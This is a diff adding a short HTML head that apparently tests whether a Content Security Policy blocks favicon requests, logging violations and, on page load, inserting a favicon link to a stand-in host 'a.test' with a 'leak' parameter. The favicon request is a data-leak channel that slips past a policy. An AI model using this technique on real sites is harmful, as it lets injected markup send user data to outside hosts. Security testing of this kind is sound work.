@@ -1,0 +1,17 @@
+<head>
+    <link rel="icon" href="https://a.test/report/?leak=c482558-GenAI">
+    <script>
+        // Log CSP violations (if any)
+        document.addEventListener("securitypolicyviolation", (e) => {
+            console.log("CSP Violation:", e);
+        });
+
+        // Automate the test by attempting to load the favicon
+        window.addEventListener("load", () => {
+            const favicon = document.createElement("link");
+            favicon.rel = "icon";
+            favicon.href = "https://a.test/report/?leak=c482558-GenAI";
+            document.head.appendChild(favicon);
+        });
+    </script>
+</head>
